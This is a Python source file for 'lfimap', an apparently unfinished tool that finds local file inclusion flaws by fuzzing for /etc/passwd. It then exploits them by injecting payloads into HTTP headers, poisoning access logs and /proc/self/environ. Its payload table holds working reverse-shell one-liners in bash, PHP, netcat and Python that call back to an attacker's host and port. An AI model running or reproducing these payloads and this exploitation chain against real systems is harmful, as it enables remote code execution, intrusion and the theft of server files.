#!/usr/bin/env python3

import os
import sys
import re
import subprocess
import requests
import random
import argparse

from argparse import RawTextHelpFormatter
import requests.exceptions
from urllib.parse import urlsplit
from urllib.parse import urlparse
from collections import deque

#TODO TEST THIS
def checkUrl():
    regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    if(re.match(regex, url) is None):
        print("URL not valid, try again.")
        sys.exit(-1)

#OK
def checkLHOST(ip):
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.match(regex, ip) is None):
        print("LHOST IP " + ip + " not valid, try again.")
        sys.exit(-1)

def prepareHeaders():
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                            "Mozilla/3.01 (Macintosh; PPC)",
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                            "Opera/8.00 (Windows NT 5.1; U; en)",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                ]

    headers = {}
    headers['User-Agent'] = random.choice(user_agents)
    headers['Accept-Language'] = 'en-US;'
    headers['Accept-Encoding'] = 'gzip, deflate'
    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = 'Close'

    return headers

#OK
def modifyHeader(key, newVal, headers):
    headers[key] = newVal

#OK
def addHeader(newKey, newVal, headers):
    headers[newKey] = newVal

#Payload is selected
def initializePayloads(payload):
    payloads = {}
    payloads['bashtcp'] = """bash -i >& /dev/tcp/{}/{} 0>&1""".format(lhost, lport)
    payloads['bashudp'] = """sh -i >& /dev/udp/{}/{} 0>&1""".format(lhost, lport)
    payloads['php'] = """<? system("/bin/bash -c 'bash -i >& /dev/tcp/"{}"/{} 0>&1'");?>""".format(lhost, lport)
    payloads['nc'] = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f""".format(lhost, lport)
    
    payloads['python'] = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""".format(lhost, lport)

    if(payload is not None):
        if(payload not in payloads):
            print("Payloads not valid. Use bashtcp, bashudp, php, nc or python")
            sys.exit(-1)
    # Use PHP as default payload method
    else:
        payload = 'php'

    return payloads[payload]

def exploitFinder(headers):
    if(cookie is not None):
        header = addHeader('Cookie', cookie, headers)
    
    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]    
        res = requests.get(url+line, headers = headers)
        
        if("root:x:0:0" in res.text or ":www-data:" in res.text):
            if(autoexp):  
                print(" [+] Trying to exploit LFI -> " + url+line)                     
                exploit = url+line
                exploit = exploit.replace('//etc/passwd', '') #TODO Better and more elegant
                
                return exploit
            else:
                exploit = ""
                print(" [+] LFI -> " + url+line)
                return exploit
        else:
            exploit = ""

    f.close()
    return exploit

def testParameterInclusion(param, lfiPath, headers):
    temp = headers
    testParam = '<?php (=!) ?>'

    modifyHeader(param, testParam, headers)
    res = requests.get(lfiPath, headers = headers)
    modifyHeader(param, temp[param], headers)

    if(testParam in res.text):
        return True
    
    return False

def exploit_self_environ(exploit, payload, headers):
    print("Trying to include /proc/self/environ ...")
    environ = '/proc/self/environ'


    #Test 'User-Agent' payload injection
    if(testParameterInclusion('User-Agent', exploit+environ, headers)):
        print("/proc/self/environ LFI using User-Agent")
        modifyHeader('User-Agent', payload, headers)
        requests.get(exploit+environ, headers = header)

    #Try 'Referer' code injection
    if(testParameterInclusion('Referer', exploit+environ, headers)):
        print("/proc/self/environ LFI using Referer")
        modifyHeader('Referer', payload, headers)
        requests.get(exploit+environ, headers = header)

    #Try 'Accept-Encoding' code injection
    if(testParameterInclusion('Accept-Encoding', exploit+environ, headers)):
        print("/proc/self/environ LFI using Accept-Encoding")
        modifyHeader('Accept-Encoding', payload, headers)
        requests.get(exploit+environ, headers = header)
    

def exploit_access_log_injection(exploit, payload, headers):
    modifyHeader('User-Agent', payload, headers)

    #Inject unencoded payload inside access.log
    requests.get(exploit+payload, headers = headers)

    f = open("access_log.txt", "r")
    for line in f:
            print("Testing URL ->" + exploit+line)
           
            #Execute payload
            res = requests.get(exploit+line, headers = headers)


def main():
    headers = prepareHeaders()
    tempHeaders = headers

    exploit = exploitFinder(headers)
    
    # If autoexploit is set, check if correct payload method is provided
    if(autoexp):
        payload = initializePayloads(args.payload)
                
        #exploit_self_environ(exploit, payload, headers) #TODO testirat
        exploit_access_log_injection(exploit, payload, headers) #TESTING

        #run_php_input(exploit, header)
        
        #run_error_log()
        #run_ssh_log()
        #run_php_filter()
    
    

    #END
    exit(0)

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="lfimap, for exploiting LFI", formatter_class=RawTextHelpFormatter, add_help=False)

    parser.add_argument('url', type=str, metavar="URL", help="\t\tprovide site url. Ex: http://example.com")
    parser.add_argument('--autoexploit', action="store_true", dest = 'autoexploit', help="\t\tTries to send a reverse shell to provided lhost and lport.")
    parser.add_argument('--lhost', type=str, metavar="<val>", dest='lhost', help="\t\tLocalhost IP address. Use with -a, otherwise it has no effect")
    parser.add_argument('--lport', type=int, metavar="<val>", dest='lport', help="\t\tLocalhost PORT number. Use with -a, otherwise it has no effect")
    parser.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help="\t\tSession cookie. Ex: 'PHPSESSID=1943785348b45'")
    parser.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\tCustom wordlist (default wordlist.txt)")
    parser.add_argument('-p', type=str, metavar="<payload>", dest='payload', help="\t\tPayload type.Available: tcp, nc, bash, sh, python, ruby, perl, lua")
    parser.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\tPrint this help message")

    args = parser.parse_args()

    url = args.url
    autoexp = args.autoexploit
    lhost = args.lhost
    lport = args.lport
    cookie = args.cookie
    wordlist = args.wordlist
    payload = args.payload
    
    checkUrl() #Checking Url

    #Check if autoexploiting is on. If yes, make sure lhost and lport are entered for rev. shell
    if(autoexp):
        if(lhost is None):                           
            lhost = input('Enter localhost IP: ')
        if(lport is None):
            lport = int(input('Enter localport number: '))
        
        checkLHOST(lhost) #Check LHOST IP
        
    #Checking port number
    if(lport):
        if(lport < 2 or lport > 65534):
            print("LPORT " + str(lport) + " not valid, try again.")
            sys.exit(-1)

    #If wordlist is not provided, use default for now 'test.txt' #TODO make default wordlist
    if(wordlist is None):
        wordlist = "test.txt"


    main()